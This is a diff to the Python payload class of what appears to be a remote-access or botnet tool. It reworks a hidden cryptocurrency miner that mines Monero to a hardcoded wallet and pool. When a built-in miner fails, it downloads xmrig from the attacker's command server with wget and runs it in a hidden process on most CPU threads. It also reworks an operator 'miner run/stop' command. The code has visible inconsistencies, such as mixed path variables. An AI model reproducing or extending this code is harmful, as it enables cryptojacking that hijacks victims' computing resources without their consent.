@@ -252,31 +252,39 @@ class Payload():
 
 
     def _init_dev_miner(self):
+        url = 'pool.hashvault.pro'
+        host_port = 80
+        api_port = 8889
+        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+
+        # first attempt using built-in python miner
         try:
-            url = 'pool.hashvault.pro:80'
-            username = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
-
-            # check cpu count to set number of threads
-            import multiprocessing
-            threads = multiprocessing.cpu_count() - 1
-
-            # pull xmrig from server if necessary
-            if not self.xmrig_path_dev:
-                self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
-
-                # set up executable
-                if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
-                    os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
-                    self.xmrig_path_dev += '.exe'
-
-                os.chmod(self.xmrig_path_dev, 755)
-
-            # excute xmrig in hidden process
-            params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, threads=threads)
-            result = self.execute(params)
-            return result
+            import pycryptonight, pyrx
+            self.child_procs['dev_miner_py'] = globals()['Miner'](url=url, port=host_port, user=user)
+            self.child_procs['dev_miner_py'].start()
         except Exception as e:
             log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+
+            # if that fails, try downloading and running xmrig
+            try:
+                threads = multiprocessing.cpu_count() - 1
+
+                # pull xmrig from server if necessary
+                if not self.xmrig_path_dev:
+                    self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+
+                    # set up executable
+                    if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
+                        os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
+                        self.xmrig_path_dev += '.exe'
+
+                    os.chmod(self.xmrig_path_dev, 755)
+
+                    # excute xmrig in hidden process
+                    params = self.xmrig_path_dev + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, user=user, host=globals()['public_ip'](), port=api_port, threads=threads)
+                    result = self.execute(params)
+            except Exception as e:
+                log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
@@ -409,11 +417,18 @@ class Payload():
                 except Exception as e:
                     log("{} error: {}".format(self.kill.__name__, str(e)))
 
-            # kill child processes
+            # kill sub processes (subprocess.Popen)
             for proc in self.execute.process_list.values():
                 try:
                     proc.kill()
-                except: pass     
+                except: pass
+
+            # kill child processes (multiprocessing.Process)
+            for child_proc in self.child_procs.values():
+                try:
+                    child_proc.terminate()
+                except: pass
+
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
 
@@ -572,7 +587,7 @@ class Payload():
         return globals()['icloud'].run()
 
 
-    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [wallet]')
+    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [port] [wallet]')
     def miner(self, args):
         """
         Run cryptocurrency miner in the background
@@ -585,32 +600,63 @@ class Payload():
         """
         args = str(args).split()
 
-        if 'run' in args and len(args) == 3:
-            cmd, url, username = args
+        if 'run' in args and len(args) == 4:
+            cmd, url, port, user = args
 
-            # pull xmrig from server if necessary
-            if not self.xmrig_path:
-                self.xmrig_path = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+            # type check port argument
+            if not port.isdigit():
+                return "Error: port must be a digit 1-65535"
 
-                # set up executable
-                if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
-                    os.rename(self.xmrig_path, self.xmrig_path + '.exe')
-                    self.xmrig_path += '.exe'
+            # first attempt using built-in python miner
+            try:
+                import pycryptonight, pyrx
+                self.child_procs['dev_miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
+                self.child_procs['dev_miner_py'].start()
+                return "Miner running in " + str(self.child_procs['dev_miner_py']).pid
+            except Exception as e:
+                log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
 
-                os.chmod(self.xmrig_path, 755)
+                # if that fails, try downloading and running xmrig
+                try:
+                    threads = multiprocessing.cpu_count() - 1
 
-            # excute xmrig in hidden process
-            params = self.xmrig_path + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=1".format(url=url, username=username)
-            result = self.execute(params)
-            return result
+                    # pull xmrig from server if necessary
+                    if not self.xmrig_path_dev:
+                        self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+
+                        # set up executable
+                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
+                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
+                            self.xmrig_path += '.exe'
+
+                        os.chmod(self.xmrig_path, 755)
+
+                        # excute xmrig in hidden process
+                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                        result = self.execute(params)
+                        return result
+                    else:
+                        # restart miner if it already exists
+                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
+                        if name in self.execute.process_list:
+                            self.execute.process_list[name].kill()
+                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                        result = self.execute(params)
+                        return result
+                except Exception as e:
+                    log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
 
         elif 'stop' in args:
+            # kill python miner
+            if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
+                self.child_procs['miner_py'].terminate()
+
+            # kill xmrig
             name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
             if name in self.execute.process_list:
                 self.execute.process_list[name].kill()
-                return "Miner stopped."
-            else:
-                return "Miner is not running."
+
+            return "Miner stopped."
 
         return "usage: {}".format(self.miner.usage)
 
